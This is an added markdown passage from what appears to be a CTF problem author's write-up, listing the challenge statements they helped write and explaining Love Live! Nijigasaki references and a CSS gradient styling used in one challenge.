+这次我自己的两道题没什么梗（除了稍微模仿了一下某电子身份服务系统），但我参与了一些其他题面编写：
+
+-   【开源论文太少了！】的八岐大蛇部分
+-   【提权潜兵 · 新指导版】彩蛋的光敏性癫痫警告
+-   【传统 C 语言核易危】的题目名、“核已畏”图片、技能五子棋
+-   【我放弃了一 key 到底】的梗是出题人选的，我改了一下缝法
+-   【千年讲堂的方形轮子 II】的整个题面
+-   【高级剪切几何】修改了一下出题人一开始的表述
+
+其中，【千年讲堂的方形轮子 II】缝了一些<span class="text-nijigasaki">虹</span>梗：
+
+<style>
+{`
+:root.light .you-name {
+    background: linear-gradient(0deg, #318e24, var(--text-color), var(--text-color));
+    background-clip: text;
+    color: transparent;
+}
+
+:root.dark .you-name {
+    background: linear-gradient(0deg, #93c18a, var(--text-color), var(--text-color));
+    background-clip: text;
+    color: transparent;
+}
+`}
+</style>
+
+-   <span lang="ja-jp">『愛♡スクリ～ム！』</span> 的歌词不必多说（本来想让 <span class="you-name">You 酱</span>作为 <span lang="ja-jp">あなた</span>，但不好缝）
+-   <span class="you-name">You 酱</span>在最后一句差点说出了[<span lang="ja-jp">ヒ</span>字真言](https://zh.moegirl.org.cn/zh-cn/只选一个人的话根本没法选啊！)，但及时打住了；这个<span lang="ja-jp">「ﾋ」</span>还长得很像半个“比”（
+-   <span class="you-name">You 酱</span>的名字有渐变色，这次的颜色比起第零届稍微调了一点，适配了暗色模式
+-   “<ruby>黑客<rp>（</rp><rt>A.L.A.N</rt><rp>）</rp></ruby>”中的“A.L.A.N”是[虹咲完结篇第二章 PV](https://www.bilibili.com/video/av115066653379234/) 里的角色
